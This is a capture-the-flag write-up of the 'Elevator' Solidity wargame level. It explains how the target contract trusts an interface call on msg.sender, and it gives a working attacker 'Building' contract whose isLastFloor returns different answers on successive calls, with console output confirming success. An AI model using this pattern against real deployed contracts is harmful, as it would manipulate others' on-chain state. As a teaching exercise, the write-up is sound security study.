# Elevator

The goal of this level is to reach the top of the building

## Code Breakdown

## Code Breakdown

[The Smart Contract's Code can be seen here.](Elevator.sol)

The contract defines two variables:

```solidity
bool public top;
uint public floor;
```

* `top`: a public boolean that indicates whether the elevator is on the top floor of the building.
* `floor`: a public uint256 that keeps track of the current floor.

```solidity
function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
```

The `goTo` function that takes a floor number as an argument. This function is intended to move the elevator to the specified `floor`. It does this by calling the `isLastFloor` function of the `Building` interface, which presumably is implemented by a contract that represents the building where the elevator is located. If the specified `floor` is not the top floor, the function sets the `floor` variable to the specified `floor` and the `top` variable to the result of calling `isLastFloor` with the current floor.
Another thing to note is that this contract takes the `Building` address from `msg.sender` which means we should call this function from the `Building` contract.

here I made a simple `Building` contract that takes the game's instance as argument when deployed, I implemented `isLastFloor` function in a way that returns **false** the first time entered (to satisfy this check)
```solidity
if (! building.isLastFloor(_floor))
```
 and then **true** the next time to set `top` to **true**
```solidity
top = building.isLastFloor(floor);
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Elevator {
    function goTo(uint _floor) external;
}

contract Building {
    Elevator elevator;
    bool public hasEntered;

    constructor(address _instance){
        elevator = Elevator(_instance);
    }

    function hack() public{
        elevator.goTo(5); // Call goTo function of Elevator, floor number here is irrelevant
    }

    // This function returns false the first time entered, then true the second time
    function isLastFloor(uint) external returns (bool){
        if (!hasEntered){
            hasEntered = true;
            return false;
        }
        hasEntered = false;
        return true;
    }
}
```
The `top` should be set to true now:

```js
>  await contract.top()
<· true
```